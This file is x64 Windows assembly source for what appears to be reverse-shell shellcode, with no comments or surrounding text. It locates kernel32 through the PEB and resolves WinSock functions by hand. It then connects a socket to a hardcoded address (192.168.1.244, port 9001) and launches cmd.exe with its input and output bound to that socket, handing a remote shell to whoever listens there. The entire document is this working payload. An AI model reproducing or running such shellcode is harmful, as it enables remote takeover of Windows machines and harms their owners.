 global main
 section .text
 main: 
   add rsp, 0xfffffffffffffdf8;
   xor rcx, rcx;
   mov rax, gs:[rcx + 0x60];
   mov rax, [rax + 0x18];
   mov rsi, [rax + 0x20];
   lodsq;
   xchg rax, rsi;
   lodsq;
   mov rbx, [rax + 0x20] ;
   mov r8, rbx;

   mov ebx, [rbx+0x3C];
   add rbx, r8;
   xor r12,r12;
   add r12, 0x88FFFFF;
   shr r12, 0x14;
   mov edx, [rbx+r12];
   add rdx, r8;
   mov r10d, [rdx+0x14];
   xor r11, r11;
   mov r11d, [rdx+0x20];
   add r11, r8;

   mov rcx, r10;
kernel32findfunction:
 jecxz FunctionNameFound;
   xor ebx,ebx;
   mov ebx, [r11+4+rcx*4];
   add rbx, r8;
   dec rcx;
   mov rax, 0x41636f7250746547;
   cmp [rbx], rax;
   jnz kernel32findfunction;
FunctionNameFound:

   xor r11, r11;
   mov r11d, [rdx+0x24];
   add r11, r8;

   inc rcx;
   mov r13w, [r11+rcx*2];

   xor r11, r11;
   mov r11d, [rdx+0x1c];
   add r11, r8;
   mov eax, [r11+4+r13*4];
   add rax, r8;
   mov r14, rax;

 mov rcx, 0x41797261;
 push rcx;
 mov rcx, 0x7262694c64616f4c;
 push rcx;
 mov rdx, rsp;
 mov rcx, r8;
 sub rsp, 0x30;
 call r14;
 add rsp, 0x30;
 add rsp, 0x10;
 mov rsi, rax;

 xor rax, rax;
 mov rax, 0x6C6C;
 push rax;
 mov rax, 0x642E32335F325357;
 push rax;
 mov rcx, rsp;
 sub rsp, 0x30;
 call rsi;
 mov r15, rax;
 add rsp, 0x30;
 add rsp, 0x10;

 mov rax, 0x7075;
 push rax;
 mov rax, 0x7472617453415357;
 push rax;
 mov rdx, rsp;
 mov rcx, r15;
 sub rsp, 0x30;
 call r14;
 add rsp, 0x30;
 add rsp, 0x10;
 mov r12, rax;


 xor rcx,rcx;
 mov cx,408;
 sub rsp,rcx;
 lea rdx,[rsp];
 mov cx,514;
 sub rsp,88;
 call r12;

 mov rax, 0x4174;
 push rax;
 mov rax, 0x656b636f53415357;
 push rax;
 mov rdx, rsp;
 mov rcx, r15;
 sub rsp, 0x30;
 call r14;
 add rsp, 0x30;
 add rsp, 0x10;
 mov r12, rax;

 sub rsp,0x208;
 xor rdx, rdx;
 sub rsp, 88;
 mov [rsp+32], rdx;
 mov [rsp+40], rdx;
 inc rdx;
 mov rcx, rdx;
 inc rcx;
 xor r8,r8;
 add r8,6;
 xor r9,r9;
 mov r9w,98*4;
 mov ebx,[r15+r9];
 xor r9,r9;
 call r12;
 mov r13, rax;
 add rsp, 0x208;

 mov rax, 0x7463;
 push rax;
 mov rax, 0x656e6e6f43415357;
 push rax;
 mov rdx, rsp;
 mov rcx, r15;
 sub rsp, 0x30;
 call r14;
 add rsp, 0x30;
 add rsp, 0x10;
 mov r12, rax;

 mov rcx, r13;
 sub rsp,0x208;
 xor rax,rax;
 inc rax;
 inc rax;
 mov [rsp], rax;
 mov rax, 0x2923;
 mov [rsp+2], rax;
 mov rax, 0xf401a8c0;
 mov [rsp+4], rax ;
 lea rdx,[rsp];
 mov r8, 0x16;
 xor r9,r9;
 push r9;
 push r9;
 push r9;
 sub rsp, 0x88;
 call r12;


 xor rcx, rcx;
 mov rax, gs:[rcx + 0x60];
 mov rax, [rax + 0x18];
 mov rsi, [rax + 0x20];
 lodsq;
 xchg rax, rsi;
 lodsq;
 mov rbx, [rax + 0x20] ;
 mov r8, rbx;

 mov rax, 0x41737365636f;
 push rax;
 mov rax, 0x7250657461657243;
 push rax;
 mov rdx, rsp;
 mov rcx, r8;
 sub rsp, 0x30;
 call r14;
 add rsp, 0x30;
 add rsp, 0x10;
 mov r12, rax;

 mov rax, 0x6578652e646d63;
 push rax;
 mov rcx, rsp;

 push r13;
 push r13;
 push r13;
 xor rax,rax;
 push ax;
 push rax;
 push rax;
 mov rax, 0x100;
 push ax;
 xor rax,rax;
 push ax;
 push ax;
 push rax;
 push rax;
 push rax;
 push rax;
 push rax;
 push rax;
 mov rax, 0x68;
 push rax;
 mov rdi,rsp;

 mov rax, rsp;
 sub rax, 0x500;
 push rax;
 push rdi;
 xor rax, rax;
 push rax;
 push rax;
 push rax;
 inc rax;
 push rax;
 xor rax, rax;
 push rax;
 push rax;
 push rax;
 push rax;
 mov r8, rax;
 mov r9, rax;
 mov rdx, rcx;
 mov rcx, rax;
 call r12;